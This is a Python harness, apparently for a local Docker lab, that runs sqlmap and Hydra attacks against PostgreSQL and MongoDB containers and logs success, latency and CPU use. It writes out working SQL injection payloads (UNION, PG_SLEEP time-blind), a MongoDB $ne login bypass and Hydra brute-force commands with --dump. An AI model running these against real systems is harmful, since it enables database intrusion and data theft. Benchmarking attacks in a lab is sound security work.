#!/usr/bin/env python3
import argparse
import csv
import json
import os
import subprocess
import threading
import time
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Callable, Dict, List, Optional, Sequence, Tuple

BASE_EXEC = ["docker", "compose", "exec", "-T", "attack-client"]
MEASURE_SCRIPT = ["python3", "/root/attack-scripts/measure_http_requests.py"]
RESULTS_DIR = Path("results")
LOGS_DIR = RESULTS_DIR / "logs"
CSV_PATH = RESULTS_DIR / "attack_metrics.csv"


@dataclass
class Attack:
    name: str
    tool: str
    target: str
    technique: str
    command: Sequence[str]
    success_parser: Callable[[int, str, str], Tuple[bool, str]]
    cpu_container: str
    latency_command: Optional[Sequence[str]] = None
    latency_run_during: bool = False


def ensure_dirs() -> None:
    RESULTS_DIR.mkdir(exist_ok=True)
    LOGS_DIR.mkdir(exist_ok=True)


def monitor_cpu(
    container: str,
    stop_event: threading.Event,
    samples: List[float],
    interval: float = 0.75,
) -> None:
    while not stop_event.is_set():
        try:
            result = subprocess.run(
                [
                    "docker",
                    "stats",
                    container,
                    "--no-stream",
                    "--format",
                    "{{.CPUPerc}}",
                ],
                capture_output=True,
                text=True,
                check=False,
            )
            if result.returncode == 0 and result.stdout.strip():
                value = result.stdout.strip().splitlines()[0].strip().rstrip("%")
                try:
                    samples.append(float(value))
                except ValueError:
                    pass
        except FileNotFoundError:
            # docker CLI not present
            break
        time.sleep(interval)


def parse_sqlmap_success(returncode: int, stdout: str, stderr: str) -> Tuple[bool, str]:
    if returncode != 0:
        return False, f"sqlmap exited with code {returncode}: {stderr.strip()}"
    normalized = stdout.lower()
    if (
        "does not seem to be injectable" in normalized
        or "all test requests failed" in normalized
    ):
        return False, "sqlmap reported target not injectable"
    if "retrieved" in normalized or "dumped" in normalized or "database:" in normalized:
        return True, "sqlmap retrieved data"
    return True, "sqlmap finished without explicit errors"


def parse_hydra_success(returncode: int, stdout: str, stderr: str) -> Tuple[bool, str]:
    if returncode != 0:
        return False, f"hydra exited with code {returncode}: {stderr.strip()}"
    lines = [line for line in stdout.splitlines() if "login:" in line.lower()]
    if lines:
        return True, lines[-1].strip()
    return False, "hydra did not report any credentials"


def run_subprocess(command: Sequence[str]) -> Tuple[int, str, str]:
    completed = subprocess.run(
        command,
        capture_output=True,
        text=True,
        check=False,
    )
    return completed.returncode, completed.stdout, completed.stderr


def run_measurement(command: Sequence[str]) -> Dict[str, Optional[float]]:
    code, out, err = run_subprocess(command)
    if code != 0:
        return {
            "avg_ms": None,
            "raw": out,
            "error": f"Measurement command failed with code {code}: {err.strip()}",
        }
    try:
        payload = json.loads(out.strip().splitlines()[-1])
        return {
            "avg_ms": payload.get("avg_ms"),
            "raw": out,
            "error": None,
        }
    except json.JSONDecodeError as exc:
        return {"avg_ms": None, "raw": out, "error": f"Invalid JSON: {exc}"}


def run_measurement_async(command: Sequence[str]) -> subprocess.Popen:
    return subprocess.Popen(
        command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )


def collect_async_measurement(proc: subprocess.Popen) -> Dict[str, Optional[float]]:
    out, err = proc.communicate()
    if proc.returncode != 0:
        return {
            "avg_ms": None,
            "raw": out,
            "error": f"Measurement command failed with code {proc.returncode}: {err.strip()}",
        }
    try:
        payload = json.loads(out.strip().splitlines()[-1])
        return {"avg_ms": payload.get("avg_ms"), "raw": out, "error": None}
    except json.JSONDecodeError as exc:
        return {"avg_ms": None, "raw": out, "error": f"Invalid JSON: {exc}"}


def write_logs(name: str, stdout: str, stderr: str) -> None:
    (LOGS_DIR / f"{name}.stdout.log").write_text(stdout)
    (LOGS_DIR / f"{name}.stderr.log").write_text(stderr)


def append_csv_row(row: Dict[str, object]) -> None:
    file_exists = CSV_PATH.exists()
    with CSV_PATH.open("a", newline="") as handle:
        writer = csv.DictWriter(
            handle,
            fieldnames=[
                "timestamp",
                "tool",
                "target_database",
                "attack_type",
                "success_rate",
                "avg_latency_ms",
                "peak_cpu_percent",
                "notes",
                "stdout_log",
                "stderr_log",
            ],
        )
        if not file_exists:
            writer.writeheader()
        writer.writerow(row)


def run_attack(config: Attack) -> Dict[str, object]:
    latency_result: Optional[Dict[str, Optional[float]]] = None
    async_measure_proc: Optional[subprocess.Popen] = None

    stop_event = threading.Event()
    cpu_samples: List[float] = []
    monitor_thread = threading.Thread(
        target=monitor_cpu,
        args=(config.cpu_container, stop_event, cpu_samples),
        daemon=True,
    )

    monitor_thread.start()

    if config.latency_command and config.latency_run_during:
        async_measure_proc = run_measurement_async(config.latency_command)
        # slight warm-up to ensure measurement is active
        time.sleep(0.5)

    proc = subprocess.Popen(
        config.command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    stdout, stderr = proc.communicate()

    stop_event.set()
    monitor_thread.join(timeout=2)

    if async_measure_proc is not None:
        latency_result = collect_async_measurement(async_measure_proc)
    elif config.latency_command is not None:
        latency_result = run_measurement(config.latency_command)

    success, notes = config.success_parser(proc.returncode, stdout, stderr)
    write_logs(config.name, stdout, stderr)

    peak_cpu = max(cpu_samples) if cpu_samples else None

    return {
        "tool": config.tool,
        "target_database": config.target,
        "attack_type": config.technique,
        "success_rate": 100 if success else 0,
        "avg_latency_ms": (
            None if latency_result is None else latency_result.get("avg_ms")
        ),
        "peak_cpu_percent": peak_cpu,
        "notes": notes,
        "stdout_log": str((LOGS_DIR / f"{config.name}.stdout.log").resolve()),
        "stderr_log": str((LOGS_DIR / f"{config.name}.stderr.log").resolve()),
        "latency_raw": None if latency_result is None else latency_result.get("raw"),
        "latency_error": (
            None if latency_result is None else latency_result.get("error")
        ),
    }


def build_attack_plan() -> List[Attack]:
    sqlmap_union_payload = "http://127.0.0.1:8081/pg/users?id=1%20UNION%20ALL%20SELECT%20NULL,current_database(),version()--"
    sqlmap_time_payload = "http://127.0.0.1:8081/pg/users?id=1%20AND%209999=(SELECT%209999%20FROM%20PG_SLEEP(1.5))"
    mongo_payload = "http://127.0.0.1:8081/mongo/login?username[$ne]=1&password[$ne]=1"
    pg_baseline_payload = "http://127.0.0.1:8081/pg/users?id=1"

    return [
        Attack(
            name="sqlmap_pg_union",
            tool="sqlmap",
            target="PostgreSQL",
            technique="联合查询注入",
            command=[
                *BASE_EXEC,
                "sqlmap",
                "-u",
                "http://127.0.0.1:8081/pg/users?id=1",
                "-p",
                "id",
                "--dbms=PostgreSQL",
                "--risk=3",
                "--level=5",
                "--technique=U",
                "--batch",
                "--dump",
            ],
            success_parser=parse_sqlmap_success,
            cpu_container="postgres-db",
            latency_command=[
                *BASE_EXEC,
                *MEASURE_SCRIPT,
                "--url",
                sqlmap_union_payload,
                "--samples",
                "10",
                "--delay",
                "0.2",
            ],
        ),
        Attack(
            name="sqlmap_pg_timeblind",
            tool="sqlmap",
            target="PostgreSQL",
            technique="时间盲注",
            command=[
                *BASE_EXEC,
                "sqlmap",
                "-u",
                "http://127.0.0.1:8081/pg/users?id=1",
                "-p",
                "id",
                "--dbms=PostgreSQL",
                "--risk=3",
                "--level=5",
                "--technique=T",
                "--time-sec=1.5",
                "--batch",
                "--dump",
            ],
            success_parser=parse_sqlmap_success,
            cpu_container="postgres-db",
            latency_command=[
                *BASE_EXEC,
                *MEASURE_SCRIPT,
                "--url",
                sqlmap_time_payload,
                "--samples",
                "5",
                "--delay",
                "0.5",
            ],
        ),
        Attack(
            name="sqlmap_mongo_nosql",
            tool="sqlmap",
            target="MongoDB",
            technique="NoSQL注入",
            command=[
                *BASE_EXEC,
                "sqlmap",
                "-u",
                "http://127.0.0.1:8081/mongo/login?username=admin&password=foo",
                "-p",
                "username",
                "--dbms=MongoDB",
                "--risk=3",
                "--level=5",
                "--batch",
            ],
            success_parser=parse_sqlmap_success,
            cpu_container="mongo-db",
            latency_command=[
                *BASE_EXEC,
                *MEASURE_SCRIPT,
                "--url",
                mongo_payload,
                "--samples",
                "10",
                "--delay",
                "0.3",
            ],
        ),
        Attack(
            name="hydra_pg_dictionary",
            tool="Hydra",
            target="PostgreSQL",
            technique="字典攻击",
            command=[
                *BASE_EXEC,
                "hydra",
                "-L",
                "/root/attack-scripts/users.txt",
                "-P",
                "/root/attack-scripts/passwords.txt",
                "postgres-db",
                "postgres",
                "-s",
                "5432",
                "-V",
                "-f",
            ],
            success_parser=parse_hydra_success,
            cpu_container="postgres-db",
            latency_command=[
                *BASE_EXEC,
                *MEASURE_SCRIPT,
                "--url",
                pg_baseline_payload,
                "--duration",
                "8",
                "--delay",
                "0.4",
            ],
            latency_run_during=True,
        ),
        Attack(
            name="hydra_pg_bruteforce",
            tool="Hydra",
            target="PostgreSQL",
            technique="暴力破解",
            command=[
                *BASE_EXEC,
                "hydra",
                "-l",
                "shortuser",
                "-x",
                "4:4:0123456789",
                "postgres-db",
                "postgres",
                "-s",
                "5432",
                "-V",
                "-I",
            ],
            success_parser=parse_hydra_success,
            cpu_container="postgres-db",
            latency_command=[
                *BASE_EXEC,
                *MEASURE_SCRIPT,
                "--url",
                pg_baseline_payload,
                "--duration",
                "10",
                "--delay",
                "0.5",
            ],
            latency_run_during=True,
        ),
    ]


def summarize(results: List[Dict[str, object]]) -> None:
    print("\n=== 攻击汇总 ===")
    header = f"{'工具':<10}{'目标数据库':<15}{'攻击类型':<16}{'成功率%':>10}{'平均延迟ms':>14}{'峰值CPU%':>12}"
    print(header)
    print("-" * len(header))
    for item in results:
        avg_latency = (
            f"{item['avg_latency_ms']:.1f}"
            if isinstance(item.get("avg_latency_ms"), (int, float))
            else "-"
        )
        peak_cpu = (
            f"{item['peak_cpu_percent']:.1f}"
            if isinstance(item.get("peak_cpu_percent"), (int, float))
            else "-"
        )
        print(
            f"{item['tool']:<10}{item['target_database']:<15}{item['attack_type']:<16}"
            f"{item['success_rate']:>10}{avg_latency:>14}{peak_cpu:>12}"
        )
    print()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Run automated attacks and collect metrics."
    )
    parser.add_argument(
        "--skip",
        nargs="*",
        help="Optional attack names to skip (e.g., sqlmap_mongo_nosql)",
    )
    args = parser.parse_args()

    ensure_dirs()
    results: List[Dict[str, object]] = []

    for attack in build_attack_plan():
        if args.skip and attack.name in args.skip:
            print(f"跳过 {attack.name}")
            continue
        print(f"\n>>> 执行 {attack.name} ({attack.tool} / {attack.technique})")
        result = run_attack(attack)
        result_row = {
            "timestamp": datetime.utcnow().isoformat(),
            "tool": result["tool"],
            "target_database": result["target_database"],
            "attack_type": result["attack_type"],
            "success_rate": result["success_rate"],
            "avg_latency_ms": result["avg_latency_ms"],
            "peak_cpu_percent": result["peak_cpu_percent"],
            "notes": result["notes"],
            "stdout_log": result["stdout_log"],
            "stderr_log": result["stderr_log"],
        }
        append_csv_row(result_row)

        if result.get("latency_error"):
            print(f"[警告] 延迟采样失败: {result['latency_error']}")
        elif result.get("avg_latency_ms") is not None:
            print(f"[信息] 平均延迟 {result['avg_latency_ms']:.1f} ms")

        if result.get("peak_cpu_percent") is not None:
            print(f"[信息] 峰值 CPU {result['peak_cpu_percent']:.1f}%")
        else:
            print("[警告] 未能收集 CPU 数据。请确认 docker CLI 可用。")

        print(f"[结果] {result['notes']}")
        results.append(result)

    summarize(results)


if __name__ == "__main__":
    main()
